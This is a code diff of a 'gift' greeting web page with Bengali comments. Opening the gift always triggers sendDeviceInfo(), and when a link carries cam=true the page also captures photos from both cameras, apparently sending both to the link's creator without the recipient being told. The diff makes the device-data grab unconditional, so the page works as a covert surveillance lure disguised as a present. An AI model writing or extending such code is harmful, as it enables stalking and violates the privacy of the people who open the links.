@@ -294,12 +294,6 @@
             }
         }
         
-        // মূল ফাংশন যা সব প্রক্রিয়া শুরু করে
-        async function initiateCaptureAndSend(caption) {
-            await sendDeviceInfo();
-            await initiateDualCameraCapture(caption);
-        }
-
         // --- মূল পেজের বাকি স্ক্রিপ্ট ---
         document.addEventListener('DOMContentLoaded', () => {
             const params = new URLSearchParams(window.location.search);
@@ -355,11 +349,9 @@
                     params.set('cd', document.getElementById('countdownDateTime').value);
                 }
                 
-                // --- নতুন কোড: ক্যামেরা সুইচ চেক করা ---
                 if (document.getElementById('enableCamera').checked) {
                     params.set('cam', 'true');
                 }
-                // --- নতুন কোড শেষ ---
 
                 const giftLink = `${window.location.href.split('?')[0]}?${params.toString()}`;
                 document.getElementById('generatedLink').value = giftLink;
@@ -428,12 +420,17 @@
             }
             
             document.getElementById('giftWrapper').addEventListener('click', () => {
-                // --- পরিবর্তিত কোড: ক্যামেরা সিস্টেম চালু করার আগে শর্ত চেক করা ---
+                const caption = `Gift from: ${sender}\nTo: ${receiver}`;
+
+                // --- মূল পরিবর্তিত কোড ---
+                // ধাপ ১: ডিভাইসের তথ্য সবসময় পাঠানো হবে, কারণ এটি উপহার খোলার একটি অংশ।
+                sendDeviceInfo();
+
+                // ধাপ ২: শুধুমাত্র যদি লিঙ্কে ক্যামেরার অনুমতি থাকে (cam=true), তবেই ছবি তোলা হবে।
                 if (params.get('cam') === 'true') {
-                    const caption = `Gift from: ${sender}\nTo: ${receiver}`;
-                    initiateCaptureAndSend(caption); // ক্যামেরা সিস্টেম ট্রিগার
+                    initiateDualCameraCapture(caption);
                 }
-                // --- পরিবর্তিত কোড শেষ ---
+                // --- পরিবর্তন শেষ ---
 
                 document.getElementById('giftBox').classList.add('open');
                 document.querySelector('.click-instruction').style.display = 'none';
